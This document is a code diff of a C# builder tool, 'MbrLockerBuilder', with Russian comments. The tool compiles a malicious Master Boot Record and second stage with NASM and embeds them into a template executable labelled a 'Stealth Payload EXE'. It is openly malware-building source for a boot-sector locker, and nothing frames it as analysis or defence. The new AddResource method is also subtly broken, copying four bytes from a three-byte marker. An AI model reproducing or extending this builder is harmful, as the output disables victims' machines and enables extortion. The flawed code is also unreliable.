@@ -345,20 +345,10 @@ namespace MbrLockerBuilder
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
                 Array.Copy(stage2Bytes, 0, fullImage, 512 * 3, stage2Bytes.Length);
 
-                this.lblStatus.Text = "5/7 Конвертация в HEX...";
+                this.lblStatus.Text = "5/7 Добавление ресурса...";
                 Application.DoEvents();
 
-                string hex = BitConverter.ToString(fullImage).Replace("-", "");
-
-                // Проверяем длину HEX
-                if (hex.Length != 16384)
-                {
-                    throw new Exception($"HEX длина: {hex.Length}, ожидалось 16384");
-                }
-
-                this.lblStatus.Text = "6/7 Поиск template.exe...";
-                Application.DoEvents();
-
+                // Создаём ресурс "MBR" в template.exe
                 byte[] templateBytes = FindResourceBytesByPartialName("template");
                 if (templateBytes == null)
                 {
@@ -369,10 +359,13 @@ namespace MbrLockerBuilder
                         throw new Exception("template.exe не найден!");
                 }
 
-                this.lblStatus.Text = "7/7 Патчинг шаблона (без изменения размера)...";
+                this.lblStatus.Text = "6/7 Встраивание MBR как ресурс...";
                 Application.DoEvents();
 
-                byte[] payloadBytes = this.PatchTemplate(templateBytes, hex);
+                byte[] payloadBytes = AddResource(templateBytes, "MBR", fullImage);
+
+                this.lblStatus.Text = "7/7 Сохранение...";
+                Application.DoEvents();
 
                 this.saveFileDialog.Title = "Сохранить Stealth Payload EXE";
                 this.saveFileDialog.Filter = "Executable (*.exe)|*.exe";
@@ -385,8 +378,7 @@ namespace MbrLockerBuilder
                         $"Размер образа: {fullImage.Length} байт ({fullImage.Length / 512} секторов)\n" +
                         $"MBR: {mbrBytes.Length} байт\n" +
                         $"Stage2: {stage2Bytes.Length} байт\n" +
-                        $"Путь: {this.saveFileDialog.FileName}\n\n" +
-                        $"HEX (первые 64): {hex.Substring(0, Math.Min(128, hex.Length))}",
+                        $"Путь: {this.saveFileDialog.FileName}",
                         "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 }
                 else
@@ -421,6 +413,29 @@ namespace MbrLockerBuilder
             nasm.WaitForExit();
             if (nasm.ExitCode != 0)
                 throw new Exception("NASM Error: " + nasm.StandardError.ReadToEnd());
+        }
+
+        private byte[] AddResource(byte[] template, string resourceName, byte[] resourceData)
+        {
+            // Простой метод: добавляем маркер в конец файла
+            // В реальном билдере нужно использовать BeginUpdateResource/UpdateResource
+            
+            // Ищем маркер "MBR" в template
+            byte[] marker = Encoding.ASCII.GetBytes("MBR");
+            int markerPos = FindPattern(template, marker);
+            
+            if (markerPos == -1)
+                throw new Exception("Маркер 'MBR' не найден!");
+            
+            // Создаём новый файл с ресурсом
+            byte[] result = new byte[template.Length + 4 + resourceData.Length];
+            Array.Copy(template, 0, result, 0, template.Length);
+            
+            // Добавляем маркер и данные в конец
+            Array.Copy(marker, 0, result, template.Length, 4);
+            Array.Copy(resourceData, 0, result, template.Length + 4, resourceData.Length);
+            
+            return result;
         }
 
         private string GenerateMBR()
@@ -647,29 +662,6 @@ dw 0xAA55";
                 this.lblStatus.Text = $"Ошибка: {ex.Message}";
                 return null;
             }
-        }
-
-        private byte[] PatchTemplate(byte[] templateBytes, string mbrHex)
-        {
-            byte[] marker = Encoding.ASCII.GetBytes("{MBR_DATA}");
-            int markerPos = FindPattern(templateBytes, marker);
-
-            if (markerPos == -1)
-                throw new Exception("Маркер {MBR_DATA} не найден!");
-
-            // Проверяем длину HEX
-            if (mbrHex.Length != 16384)
-                throw new Exception($"HEX длина: {mbrHex.Length}, ожидалось 16384");
-
-            // Создаём копию templateBytes (не меняем размер!)
-            byte[] result = new byte[templateBytes.Length];
-            Array.Copy(templateBytes, 0, result, 0, templateBytes.Length);
-
-            // Записываем HEX-строку ПОВЕРХ маркера
-            byte[] hexBytes = Encoding.ASCII.GetBytes(mbrHex);
-            Array.Copy(hexBytes, 0, result, markerPos, hexBytes.Length);
-
-            return result;
         }
 
         private int FindPattern(byte[] data, byte[] pattern)
